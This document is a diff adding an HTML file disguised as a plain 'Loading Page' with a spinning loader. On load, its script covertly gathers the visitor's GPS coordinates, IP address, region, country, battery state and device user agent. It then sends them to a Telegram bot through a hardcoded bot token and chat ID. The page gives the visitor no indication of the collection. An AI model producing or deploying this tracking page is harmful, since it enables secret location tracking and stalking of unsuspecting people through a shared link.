@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading Page</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+        }
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 16px solid #3498db;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        // Fungsi untuk mendapatkan informasi lokasi
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Fungsi untuk menampilkan posisi
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            // Mengambil informasi IP dan lokasi
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const userInfo = {
+                        ip: data.ip,
+                        region: data.region,
+                        country: data.country_name,
+                        batteryLevel: 'N/A', // Akan diisi nanti
+                        batteryStatus: 'N/A', // Akan diisi nanti
+                        deviceInfo: navigator.userAgent,
+                        androidVersion: 'N/A', // Akan diisi nanti
+                        deviceBrand: 'N/A' // Akan diisi nanti
+                    };
+
+                    // Mengambil informasi baterai
+                    if ('getBattery' in navigator) {
+                        navigator.getBattery().then(battery => {
+                            userInfo.batteryLevel = `${Math.round(battery.level * 100)}%`;
+                            userInfo.batteryStatus = battery.charging ? "Sedang Mengisi Daya" : "Sedang Tidak Mengisi Daya";
+                            sendMessageToTelegram(userInfo, locationLink);
+                        });
+                    } else {
+                        sendMessageToTelegram(userInfo, locationLink);
+                    }
+                });
+        }
+
+        // Fungsi untuk menangani error geolocation
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
+            }
+        }
+
+        // Fungsi untuk mengirim pesan ke Telegram
+        function sendMessageToTelegram(userInfo, locationLink) {
+            const botToken = '7617587779:AAHqMael8bWoxGgSgPXdlZsbKPaStAps_VA'; // Ganti dengan token bot Telegram Anda
+            const chatId = '6366622835'; // Ganti dengan chat ID tujuan
+            const message = `
+User Information
+IP Address : ${userInfo.ip}
+Region : ${userInfo.region}
+Country : ${userInfo.country}
+Location : ${locationLink}
+Battery : ${userInfo.batteryLevel}
+Status Battery : ${userInfo.batteryStatus}
+
+Device Information : ${userInfo.deviceInfo}
+
+Version Android : ${userInfo.androidVersion}
+Brand Device : ${userInfo.deviceBrand}
+            `;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Message sent to Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+        }
+
+        // Memulai proses
+        getLocation();
+    </script>
+</body>
+</html>
